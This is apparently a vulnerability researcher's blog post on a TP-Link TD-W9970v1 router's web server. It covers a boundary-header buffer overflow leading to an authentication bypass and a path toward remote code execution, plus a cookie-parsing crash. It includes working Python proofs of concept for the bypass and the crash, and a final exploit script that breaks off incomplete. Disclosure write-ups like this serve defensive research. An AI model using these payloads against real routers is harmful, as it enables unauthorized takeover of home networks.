In my earlier vulnerability research attempts I analyzed the router I used in my
home network, specifically the TP-Link TD-W9970v1. The router is an old model
that is (recently confirmed to be) EoL. The vulnerability is very simple but
it's relatively tricky to achieve remote code execution, which is the reason why
I decided to write a blog post about it.

There are two vulnerabilities in `httpd`, the webserver daemon that serves the
configuration interface of the router. These are:

- A buffer overflow causing authentication bypass and RCE,
- A nullptr dereference causing DoS.

## the recon

Having no hardware knowledge, my research was focused solely on the software
running on the device. To get access to the binaries, I could grab the latest
firmware from manifacturer's website and flash it. Since firmware packages are
not encrypted, binaries can be extracted easily. Though instead, I wanted to
keep the firmware as-is and used a different approach.

There is a code execution exploit that leverages code injection vulnerabilities
that can be triggered via configuration export/import [[1]]. (Note that although
it is a code execution vulnerability, it requires authentication and a restart
to the device.) Using this vulnerability I popped a shell and dumped the whole
filesystem.

I dumped and analyzed `httpd` since it is the http server that provides the
configuration interface and from what I've seen on the internet it is the binary
that most likely has vulnerabilities.

Information about `httpd`:

```
$ file httpd
httpd: ELF 32-bit MSB executable, MIPS, MIPS32 version 1 (SYSV), dynamically
linked, interpreter /lib/ld-uClibc.so.0, stripped

```

## vuln 1: buffer overflow and authentication bypass

I analyzed the binary in GHIDRA and found that most of the parsing is done in
the function `http_parser_main`. In the meantime I checked imports for
potentially vulnerable functions and saw that `strcpy` was in use. I went
through the references and saw that most of the time it's used to copy string
literals, which is a valid use for it. However, there is a call in
`http_parser_main` that copies a string from the request.

<div>
![strcpy1](/static/images/tplink-rce/strcpy1.png)
</div>

From [mozilla developer page]:

<div>
![multipart1](/static/images/tplink-rce/multipart1.png)
</div>

[mozilla developer page]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/POST

The delimiter that will be used to seperate data blocks is parsed in the given
block. The string is assumed to be terminated by a semicolon, the terminator
byte is converted to a null terminator and then the string is copied to a buffer
with `strcpy`.

The vulnerability is easy to trigger, there aren't really any constraints to
consider. The only constraint here is that lines are limited to 0x400 bytes. The
following request will trigger the buffer overflow:

```
POST /test HTTP/1.0
Content-Type: multipart/form-data;boundary=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA;
```

Minus the necessary data and the last byte being null, it is possible to copy
exactly 980 bytes into the buffer.

To assess the impact of this vulnerability, I analyzed the buffer. It is a
static buffer sitting at `0x00437d50` in the `.bss` section. Judging from
references, it's defined as a `0x100` length buffer. I analyzed the subsequent
buffers and found the buffer that keeps the login credentials at `0x0043810d`
which can be overwritten.

```
gefâž¤  x/s 0x0043810d
0x43810d:	"YWRtaW46YWRtaW4="
```

The credentials are stored as base64 encoded strings in the form of
`admin:password`. `YWRtaW46YWRtaW4=` is decoded to `admin:admin` which is the
default login credentials for this router.

On a side note, after analyzing the function that does the authentication
`http_auth_doAuth`, I saw that the buffer is actually the second entry in a list
of four that starts at offset `0x004380e0`. Interestingly the rest of the
entries are not in use.

<div>
![auth1](/static/images/tplink-rce/auth1.png)
</div>

Overwriting the base64 string allows authentication bypass without any crashes.

```python
import socket
from base64 import b64encode
import sys

HOST = sys.argv[1]  # IP of the router 
PORT = 80           # httpd port

payload = b"POST / HTTP/1.1\r\n" \
 + b"Content-Type: multipart/form-data;boundary=%s\r\n\r\n" \
    % (b'A'*957 + b64encode(b'erfur:wololo'))

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    s.sendall(payload)
    data = s.recv(1024)

print(f"Received {data!r}")
```

Being able to bypass authentication has a high impact, however it does not allow
the attacker to directly execute code on the device. I'll revisit this
vulnerability after I explain the second one.

## vuln 2: nullptr dereference and denial of service

I wanted to fuzz `http_parser_main` in order to find vulnerabilities that I
might've missed. Since it's a MIPS binary I went with a qiling-based harness. I
dumped the input state with gdb, hooked the necessary calls and ran afl++ with
the harness. In a couple hours there were tens of crashes, though they all
turned out to be caused by the same bug.

<div>
![dos1](/static/images/tplink-rce/dos1.png)
</div>

In the code that parses `Cookie` headers, there is a function that parses and
sets pointers to name and value pairs.

<div>
![dos2](/static/images/tplink-rce/dos2.png)
</div>

It is possible that the function may return without setting the `val` pointer.
However, the value of the pointer is not checked in the previous block, allowing
a cookie header without a value to cause a nullptr dereference and effectively
crashing httpd. Here's a proof of concept:

```python
import socket
import sys

HOST = sys.argv[1]  # IP of the router 
PORT = 80           # httpd port

payload = b"GET / HTTP/1.1\r\nCookie: Authorization;\r\n\r\n"

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    s.sendall(payload)
    data = s.recv(1024)
```

## vuln 1 revisited: arbitrary write primitive and rce

In my first analysis of the memory that is in the range of the buffer overflow,
I couldn't make sense of how some of the buffers were used by the referenced
functions. After a second take, I realized that there is a static circular
doubly-linked list (yes its a mouthful) implementation that is used to parse the
arguments in request URIs.

<div>
![args1](/static/images/tplink-rce/args1.png)
</div>

The `argsList` buffer sits at `0x437e54` and is initialized by
`http_parser_init`. There are `0x28` nodes in the buffer and these nodes are
initialized by forming a doubly linked list with the head `argsListEmptyHead`
(the head is a static variable that sits somewhere else in `.bss`). 

<div>
![args2](/static/images/tplink-rce/args2.png)
</div>

In the function `http_parser_argStrToList`, arguments appended to uri are parsed
and the created nodes are added to another head, `argsListUsedHead`.

It is possible to overflow `argsList` in such a way that allows writing 4bytes
at an arbitrary location. Initially the linked list looks like this:

<div>
![linkedlist1](/static/images/tplink-rce/linkedlist1.svg)
</div>

When a new argument is parsed, the first empty node is taken from
`argsListEmptyHead`, its name and value pointers are set and then the node is
removed from the empty list and added to `argsListUsedHead`. If I set `next` as
the data and `prev` as the destination address, after the first argument is
parsed, the following lines will write my data to my address with only one
caveat: The value placed in `next` must be a valid memory location and the
subsequent four bytes must be writeable.

<div>
![args3](/static/images/tplink-rce/args3.png)
</div>

One final note is that uri arguments are parsed after authentication, which is
a trivial constraint in this case.

The arbitrary write primitive is useful to overwrite the GOT table. The last
piece of business is to find a place for our shellcode. Interestingly, when I
inspected the memory maps I saw that most of `.bss` is actually executable.

```
~ # cat /proc/1035/maps
cat /proc/1035/maps
00400000-00413000 r-xp 00000000 1f:00 221        /usr/bin/httpd
00423000-00424000 rw-p 00013000 1f:00 221        /usr/bin/httpd
00424000-00439000 rwxp 00000000 00:00 0
00a66000-00a67000 rwxp 00000000 00:00 0          [heap]
00a67000-00a68000 rwxp 00000000 00:00 0          [heap]
```

This map table is different than r2 and GHIDRA output and I have no idea why.
Ultimately it is a good thing for the exploit becuase we can place the shellcode
in `boundaryBuffer` and overwrite GOT table with its location.

## the exploit

Exploitation is done in the following steps:

1. Overwrite authentication credentials and the linked list.
2. Trigger arbitrary write and overwrite a GOT table entry.
3. Write shellcode into the boundary buffer.
3. Trigger the overwritten GOT entry.
4. Profit.

Since the linked-list operation will overwrite the buffer that will hold the
shellcode, it should be sent after. The combined payload will look like this:

<div>
![payload](/static/images/tplink-rce/payload.svg)
</div>

Since the buffer is copied with `strcpy`, the null bytes will terminate the
copy. So in order to copy everything, the payload is split into non-null chunks
and the chunks will be placed from last to first. The final exploit is below:

```python
import socket
import sys
import base64

overflow_template = b"POST /test HTTP/1.1\r\n"
overflow_template += b"Content-Type: multipart/form-data;boundary=%b;\r\n\r\n"

linkedlist_template += b"Cookie: Authorization=Basic %b\r\n\r\n"
